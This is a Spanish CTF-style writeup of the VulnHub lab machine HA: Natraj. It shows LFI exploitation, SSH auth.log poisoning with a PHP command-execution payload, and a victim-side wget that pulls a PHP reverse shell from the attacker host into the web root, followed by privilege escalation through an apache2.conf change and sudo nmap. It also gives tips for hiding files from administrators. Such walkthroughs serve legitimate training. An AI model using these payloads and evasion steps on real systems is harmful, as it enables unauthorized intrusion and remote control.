---
title: "HA: Natraj – Writeup sin Metasploit (VulnHub)"
description: "Resolución paso a paso de la máquina HA: Natraj de VulnHub sin Metasploit: enumeración web, explotación de LFI a RCE y escalada de privilegios a root."
pubDate: "2023-04-20"
author: "EVLBYTE"
tags: ["Escalada de Privilegios", "HA Natraj", "LFI", "Log Poisoning", "OSCP PREP", "RCE", "Sin Metasploit", "VulnHub", "WriteUp"]
category: "Ciberseguridad"
heroImage: "/images/2023_04_image.png"
draft: false
---

Esta es una maquina bastante simple, el truco es hacer una buena enumeración, tanto de directorios y archivos. (https://www.vulnhub.com/entry/ha-natraj,489)

![Imagen técnica](/images/2023_04_image.png)

## 1. Descubrimiento y Enumeración

```bash
sudo netdiscover -i eth0
```

![Imagen técnica](/images/2023_04_image-1.png)

por la descripción del fabricante ubicamos fácilmente que la maquina victima tiene la IP 192.168.56.101. Procedemos ahora a hacer un escaneo de puertos con la herramienta nmap:

```bash
sudo nmap -n -Pn -p- --open -sT -sV -T 5 -O 192.168.56.101 -oX PuertosAbiertos.xml
```

A continuación describo la función de cada opción utilizada en el comando:

-O: Activar la detección de sistema operativo (SO)-n: Desactiva el escaneo de DNS del host-Pn: Desactiva la comprobación por ICMP del host, lo considera activo-p-: Activa el escaneo en todos los puertos 65535--open: Muestra en la salida únicamente los puertos que están abiertos, los filtrados o cerrados no los toma en cuenta-sT: Realiza una comprobación del servicio utilizando TCP/SYNC-sV: Realiza un análisis de la versión del servicio detectado-T 5: Nivel de agresividad del escaneo, este el mas alto-oX: exporta el resultado en formato XML

![Imagen técnica](/images/2023_04_image-2.png)

Identificamos que el host corre un Ubuntu Debian con kernel 3.2 - 4.9 y que tiene abiertos los puertos TCP 22 corriendo una version de openssh 7.6p1 y el TCP 80 corriendo un apache httpd 2.4.29

ingresamos por http desde un navegador a la IP victima e identificamos que es una pagina informativa, en la cual no tenemos algun vector del cual aprovecharnos, por lo que debemos buscar mas a fondo, realizaremos una enumeración de directorios que pudieran estar expuestos en la pagina web, usando el aplicativo DirectoryBuster o dirb:

```bash
dirb http://192.168.56.101/ -w -R
```

![Imagen técnica](/images/2023_04_image-3.png)

Vemos que encontramos 2 directorios que podemos listar desde el navegador:

![Imagen técnica](/images/2023_04_image-4.png)

al abrir el archivo file.php vemos que no obtenemos ningún tipo de respuesta, por lo que procederemos a verificar a través de la aplicación fuzz si podemos identificar alguna variable utilizable que podamos aprovechar usando el todo GET que nos permita realizar ataques de RCE (Remote Code Execution) o LFI (local file inclution)

```bash
RCE
wfuzz -t 1000 -c --hl=0 -w /usr/share/wordlists/dirb/common.txt "http://192.168.56.101/console/file.php?FUZZ=whoami"
```

![Imagen técnica](/images/2023_04_image-6.png)

```bash
LFI
wfuzz -t 1000 -c --hl=0 -w /usr/share/wordlists/dirb/common.txt "http://192.168.56.101/console/file.php?FUZZ=../../../../../../../../../../etc/passwd"
```

![Imagen técnica](/images/2023_04_image-5.png)

## 2. Explotación y Acceso Inicial vía LFI

Como podemos observar el archivo file.php nos permite realizar un LFI utilizando la variable file, desde la cual podemos obtener lectura del archivo /etc/passwd y logramos observar el listado de usuarios configurados en la maquina victima:

![Imagen técnica](/images/2023_04_image-7.png)

```bash
http://192.168.56.101/console/file.php?file=../../../../../../../../../../etc/passwd
```

obtenemos 2 usuarios: mahakal y natraj, por lo que podemos realizar alguna inspección de archivos de log para verificar si podemos ver archivos de logs como los de ssh desde el archivo del navegador. y efectivamente si es posible verlos

![Imagen técnica](/images/2023_04_image-8.png)

ya que estos logs estan siendo reproducidos desde un interprete de PHP podemos tratar de incluir dentro del archivo que registra los logs un codigo php que nos permita ejecutar comandos remotos, para esto usaremos el protocolo ssh ya que es el puerto que nos permite autenticarnos.

Validaremos que efectivamente los logs del servicio SSH se registran en este archivo usando el siguiente comando:

```bash
ssh 'usuario de prueba'@192.168.56.101
```

![Imagen técnica](/images/2023_04_image-9.png)

verificamos nuevamente el archivo de logs desde el navegador y obtenemos esta entrada:

![Imagen técnica](/images/2023_04_image-10.png)

por lo que procedemos a "envenenar el archivo de logs" para que nos permita ejecutar comandos, para esto usaremos nuevamente SHH pero agregaremos como username el siguiente codigo:

```bash
ssh '<?php system($_GET['cmd']); ?>'@192.168.56.101
```

![Imagen técnica](/images/2023_04_image-11.png)

Al hacer esto agregamos la variable cmd a la cual le podemos pasar cualquier tipo de comando que queramos que ejecute dentro del servidor, para la prueba de concepto utilizaremos el siguiente codigo:

```bash
http://192.168.56.101/console/file.php?file=../../../../../../../../../../var/log/auth.log&cmd=whoami;id;echo+PRUEBA
```

![Imagen técnica](/images/2023_04_image-12.png)

Enviamos 3 comandos: whoami, id y echo, lo que nos indica que hemos creado un RCE (ejecución de código remotamente). por lo que podemos realizar algunas verificaciones como enviar el comando pwd para identificar la carpeta en la que estamos actualmente:

```bash
cmd=ls+-ls+../;pwd
```

![Imagen técnica](/images/2023_04_image-13.png)

Esto nos da la oportunidad de subir un script de php que pueda levantar una consola reversa desde la maquina victima hasta nuestro equipo atacante, para ello usaremos algunos scripts publicos que funcionan muy bien como el PHP REVERSE SHELL de @pentestmonkey que amablemente mantiene su repositorio actualizado en github con muchas herramientas y en esta ocasión usaremos el reverse shell php, para esto debemos descargar el archivo php desde github con el comando:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

![Imagen técnica](/images/2023_04_image-14.png)

![Imagen técnica](/images/2023_04_image-15.png)

Para efectos de esta prueba, únicamente editaremos la IP de destino que en este caso es la IP de la maquina atacante, ya que forzaremos a que la maquina victima levante una sesión de consola interactiva con la maquina atacante cuando se ejecute el este script de PHP,  guardamos el archivo con un nombre que pueda pasar desapercibido ya que este archivo esta en la carpeta raiz del servicio de apache, por lo que en alguna auditoria simple un administrador en una rutina de mantenimiento podria detectar el script malicioso que vamos a cargar.

para cargar el archivo a la carpeta /var/www/html usaremos el comando wget por lo que debemos ejecutar un servidor http en la carpeta donde tendremos los scrips que compartiremos, para este caso usaremos python para realizarlo directamente en un comando:

```bash
python3 -m http.server 9444
```

![Imagen técnica](/images/2023_04_image-16.png)

Para subir los archivos ejecutaremos el siguiente comando dentro del RCE que creamos dentro del log de autenticaciones de ubuntu:

```bash
cmd=wget+http://192.168.56.102:9444/php-reverse-shell.php+-O+../you.php
y luego usaremos para validar que este en la carpeta que necesitamos
cmd=ls+-ls+../
```

![Imagen técnica](/images/2023_04_image-17.png)

Hemos conseguido subir nuestro archivo php, llamado you.php directamente al root del servidor web, por lo que ahora ya podríamos ejecutar el archivo malicioso desde cualquier navegador y colocar nuestro equipo atacante en escucha para la conexión ya que es una conexión especifica que solo sucederá una vez mientras se este en ejecución el archivo. En esta ocasión utilizaremos netcat para poner nuestro equipo atacante en escucha:

```bash
nc -lvnp 1234
```

El comando esta compuesto por las opciones:

-l=modo escucha-v=modo verbose-n=únicamente IPs no realiza ningún tipo de resolución de dns-p=puerto de escucha que se desea abrir

Una vez teniendo este comando corriendo únicamente debemos abrir desde cualquier navegador la siguiente ruta:

```bash
http://192.168.56.101/you.php
```

![Imagen técnica](/images/2023_04_image-18.png)

Hemos logrado una sesión remota del equipo, en este momento estamos dentro del equipo como el usuario www-data, el cual tiene permisos limitados dentro del servidor, pero nos permite revisar todo el equipo en busca de vulnerabilidades que podamos utilizar para escalar privilegios y llegar el acceso de root.

## 3. Escalada de Privilegios

Con la consola reversa hemos obtenido acceso limitado al equipo sin embargo podemos realizar algunas acciones como por ejemplo crear scritps, buscar archivos que podamos leer o modificar o buscar programas que podamos ejecutar y que tengan permisos de root.

Para este tema utilizaremos 2 scripts que funcionan muy bien para ayudarnos a buscar este tipo de vulnerabilidades. Linux Exploit Sugester (les) y Linux Smart Enumeration (lse) ambos escritos en bash por lo que no necesitamos instalar nada en la maquina victima. para obtener estos archivos utilizaremos el mismo proceso que usamos cuando subimos el archivo PHP_REVERSE_SHELL.php, descargaremos en nuestra maquina local los archivos y luego habilitaremos un servidor web con python para que desde la victima podamos descargar estos archivos.

Para descargar los scripts automatizado usaremos estos comandos:

```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

ya con los script descargados en nuestro equipo atacante, únicamente necesitamos iniciar un servidor web simple con pyhton usando el siguiente comando:

```bash
python3 -m http.server 9444
```

dentro de la maquina victima, desde la consola interactiva que tenemos debemos buscar un directorio donde almacenar y correr estos scripts, es importante tomar en cuenta que en todo momento podría un administrador del sistema estar monitoreando carpetas útiles e importantes por lo es recomendable utilizar la carpeta tmp ya que por defecto es una carpeta que tiene información volátil y que cambia constantemente. descargaremos nuestros scripts de análisis de vulnerabilidades usando los siguientes comandos:

```bash
wget http://192.168.56.102:9444/lse.sh -O /tmp/lse.sh
wget http://192.168.56.102:9444/les.sh -O /tmp/les.sh
```

Utilizando el comando ls -ls /tmp/ podemos verificar que los archivos ya fueron descargados y almacenados en la carpeta tmp en la raíz del sistema:

![Imagen técnica](/images/2023_04_image-19.png)

Ahora vamos a correr primero el script linux exploit sugester, el cual podrá indicarnos si el sistema o kernel pueden ser explotados, para ejecutar estos scripts sin realizar ningún tipo de cambio de privilegios debemos correrlos directamente desde bash:

```bash
bash /tmp/les.sh
```

![Imagen técnica](/images/2023_04_image-20.png)

Podemos ver que la salida de este script nos indica que la vulnerabilidad CVE-2021-3156 probablemente podría utilizarse, sin embargo debemos tomar en cuenta que este script únicamente nos indica en el campo Exposure:probable pues coincide con la versión del sistema que estamos escaneando con las reportadas en el CVE, sin embargo el script no fue capaz de validar exitosamente si fue parchado o no, por lo exploraremos otras opciones antes de intentar explotar esta sugerencia.

Para correr el linux smart enumertion (lse) usaremos la misma técnica del script anterior, correrlo directamente desde bash:

```bash
bash /tmp/lse.sh
```

![Imagen técnica](/images/2023_04_image-21.png)

Este script nos indica 2 cosas interesantes que podemos revisar,  tenemos permisos de ejecución de un binario llamado vmware-user-suid-wrapper que es propietario de root y vemos que tenemos acceso de lectura, escritura y ejecución en el archivo de configuración de apache, concretamente /etc/apache2/apache2.conf

![Imagen técnica](/images/2023_04_image-22.png)

al intentar correr el binario al cual tenemos acceso de ejecución notamos que es un complemento de otra aplicación y que no puede correr, probablemente se ejecuta derivado de la virtualización de esta maquina virtual en Vmware:

![Imagen técnica](/images/2023_04_image-23.png)

por lo que nos concentraremos en aprovecharnos del permiso al archivo apache2.conf, haciendo una investigación rápida en Google encontramos este articulo:

```bash
https://www.simplified.guide/apache/change-user-and-group
```

donde se indica que podemos configurar el servicio de apache para que ejecute con un usuario especifico, según el articulo indica que podemos utilizar inclusive el usuario root, pero en la versión que esta corriendo el equipo victima ya no es posible, por lo que vamos a configurar el servidor para que en vez de ejecutar apache como www-data lo ejecute en este caso como el usuario mahakal

![Imagen técnica](/images/2023_04_image-24.png)

Luego necesitamos forzar el reinicio del servicio de apache pero debido a que estamos como usuario www-data no es posible realizar operación, por lo que con fines de la prueba procederemos a reiniciar la maquina virtual para que el servicio se reinicie y tome los valores del archivo de configuración. cuando el servicio vuelve a estar disponible repetimos el proceso:

en nuestra maquina atacante nos ponemos en escucha con el comando:

```bash
nc -lvnp 1234
```

y ejecutamos el script de PHP que subimos al principio, el cual esta en la siguiente url

```bash
http://192.168.56.101/you.php
```

y obtenemos una conexion reversa pero esta vez con el usuario mahakal

![Imagen técnica](/images/2023_04_image-25.png)

nuestra misión ahora es intentar escalar del usuario mahakal al usuario root por lo que usamos el comando sudo -l el cual nos valida si el usuario puede ejecutar algún comando como root sin necesidad de password, en este caso encontramos que el usuario tiene acceso al binario de nmap.

![Imagen técnica](/images/2023_04_image-26.png)

Utilizando información que podemos encontrar en internet, encontramos que es posible realizar una escalación de privilegios creando una variable de entorno a la cual le podamos asignar una instrucción la cual abrir una shell, y como el binario nmap lo estaríamos corriendo como root la shell abierta se ejecuta como root dándonos acceso a hacer cualquier cosa.

![Imagen técnica](/images/2023_04_image-27.png)

![Imagen técnica](/images/2023_04_image-28.png)

![Imagen técnica](/images/2023_04_image-29.png)

## 4. Lecciones Aprendidas y Mitigación

Reconocimiento

- Identificación del host con netdiscover
- Escaneo de puertos
- Fuzzing de archivos y variables

Explotación

- Ataque LFI (Local File Inclution)
- Envenenamiento de archivos de Log
- Shell reversa PHP

Pasar archivos entre equipos (Atacante / Victima) / (Victima / Atacante)

Escalación de Privilegios

- Utilización de scripts automatizadosLinux Smart Enumeation -  LSE

Linux Exploit Sugester - LES
- Investigar como aprovechar la mala configuración de un archivo importante
- SUID
